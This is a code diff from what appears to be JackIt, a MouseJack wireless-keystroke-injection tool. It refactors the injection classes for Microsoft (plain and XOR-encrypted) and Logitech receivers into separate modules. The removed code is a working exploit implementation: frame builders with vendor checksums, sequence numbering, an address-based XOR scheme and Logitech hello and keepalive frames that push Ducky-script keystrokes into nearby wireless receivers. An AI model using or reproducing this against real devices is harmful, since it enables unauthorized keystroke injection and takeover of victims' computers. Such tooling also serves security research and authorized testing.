@@ -9,6 +9,9 @@ import tabulate
 from lib import nrf24, nrf24_reset
 import keymap
 import duckyparser
+import logitech
+import microsoft
+import microsoft_enc
 
 
 __version__ = 0.02
@@ -213,143 +216,6 @@ class JackIt(object):
                     time.sleep(frame[1] / 1000.0)
 
 
-class MicrosoftHID(object):
-    ''' Injection code for MS mouse '''
-
-    def __init__(self, address, payload):
-        self.address = address
-        self.device_vendor = 'Microsoft'
-        self.sequence_num = 0
-        self.payload_template = payload[:].tolist()
-        self.payload_template[4:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
-        self.payload_template[6] = 67
-
-    def checksum(self, payload):
-        # MS checksum algorithm - as per KeyKeriki paper
-        payload[-1] = 0
-        for i in range(0, len(payload) - 1):
-            payload[-1] ^= payload[i]
-        payload[-1] = ~payload[-1] & 0xff
-        return payload
-
-    def sequence(self, payload):
-        # MS frames use a 2 bytes sequence number
-        payload[5] = (self.sequence_num >> 8) & 0xff
-        payload[4] = self.sequence_num & 0xff
-        self.sequence_num += 1
-        return payload
-
-    def key(self, payload, key):
-        payload[7] = key['mod']
-        payload[9] = key['hid']
-        return payload
-
-    def frame(self, key={'hid': 0, 'mod': 0}):
-        return self.checksum(self.key(self.sequence(self.payload_template[:]), key))
-
-    def build_frames(self, attack):
-        for i in range(0, len(attack)):
-            key = attack[i]
-            key['frames'] = []
-            if i < len(attack) - 1:
-                next_key = attack[i + 1]
-            else:
-                next_key = None
-
-            while self.sequence_num < 10:
-                key['frames'].append([self.frame(), 0])
-
-            if key['hid'] or key['mod']:
-                key['frames'].append([self.frame(key), 5])
-                if not next_key or key['hid'] == next_key['hid'] or next_key['sleep']:
-                    key['frames'].append([self.frame(), 0])
-
-            elif key['sleep']:
-                count = int(key['sleep']) / 10
-                for i in range(0, count):
-                    key['frames'].append([self.frame(), 0])
-
-
-class MicrosoftEncHID(MicrosoftHID):
-    ''' Injection code for MS mouse (encrypted) '''
-
-    def __init__(self, address, payload):
-        self.address = address
-        self.device_vendor = 'Microsoft'
-        self.sequence_num = 0
-        self.payload_template = self.xor_crypt(payload[:].tolist())
-        self.payload_template[4:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
-        self.payload_template[6] = 67
-
-    def xor_crypt(self, payload):
-        # MS encryption algorithm - as per KeyKeriki paper
-        raw_address = self.address[::-1][:5]
-        for i in range(4, len(payload)):
-            payload[i] ^= raw_address[(i - 4) % 5]
-        return payload
-
-    def frame(self, key={'hid': 0, 'mod': 0}):
-        return self.xor_crypt(self.checksum(self.key(self.sequence(self.payload_template[:]), key)))
-
-
-class LogitechHID(object):
-    ''' Injection for Logitech devices '''
-
-    def __init__(self, address, payload):
-        self.address = address
-        self.device_vendor = 'Logitech'
-        # Mouse frames use type 0xC2
-        # Multmedia key frames use type 0xC3
-        # To see why this works, read diagram 2.3.2 of:
-        # https://lekensteyn.nl/files/logitech/Unifying_receiver_DJ_collection_specification_draft.pdf
-        # (discovered by wiresharking usbmon)
-        self.payload_template = [0, 0xC1, 0, 0, 0, 0, 0, 0, 0, 0]
-        self.keepalive = [0x00, 0x40, 0x04, 0xB0, 0x0C]
-        self.hello = [0x00, 0x4F, 0x00, 0x04, 0xB0, 0x10, 0x00, 0x00, 0x00, 0xED]
-
-    def checksum(self, payload):
-        # This is also from the KeyKeriki paper
-        # Thanks Thorsten and Max!
-        cksum = 0xff
-        for n in range(0, len(payload) - 1):
-            cksum = (cksum - payload[n]) & 0xff
-        cksum = (cksum + 1) & 0xff
-        payload[-1] = cksum
-        return payload
-
-    def key(self, payload, key):
-        payload[2] = key['mod']
-        payload[3] = key['hid']
-        return payload
-
-    def frame(self, key={'hid': 0, 'mod': 0}):
-        return self.checksum(self.key(self.payload_template[:], key))
-
-    def build_frames(self, attack):
-        for i in range(0, len(attack)):
-            key = attack[i]
-
-            if i == 0:
-                key['frames'] = [[self.hello[:], 12]]
-            else:
-                key['frames'] = []
-
-            if i < len(attack) - 1:
-                next_key = attack[i + 1]
-            else:
-                next_key = None
-
-            if key['hid'] or key['mod']:
-                key['frames'].append([self.frame(key), 12])
-                key['frames'].append([self.keepalive[:], 0])
-                if not next_key or key['hid'] == next_key['hid'] or next_key['sleep']:
-                    key['frames'].append([self.frame(), 0])
-            elif key['sleep']:
-                count = int(key['sleep']) / 10
-                for i in range(0, count):
-                    key['frames'].append([self.keepalive[:], 10])
-
-
 def banner():
     print r"""
      ____.              __   .___  __
@@ -511,11 +377,11 @@ def cli(debug, script, lowpower, interval, layout, address, vendor, reset):
             # Figure out what we've got
             device_type = jack.fingerprint_device(payload)
             if device_type == 'Microsoft HID':
-                hid = MicrosoftHID(address, payload)
+                hid = microsoft.HID(address, payload)
             elif device_type == 'MS Encrypted HID':
-                hid = MicrosoftEncHID(address, payload)
+                hid = microsoft_enc.HID(address, payload)
             elif device_type == 'Logitech HID':
-                hid = LogitechHID(address, payload)
+                hid = logitech.HID(address, payload)
 
             if hid:
                 # Attempt to ping the devices to find the current channel
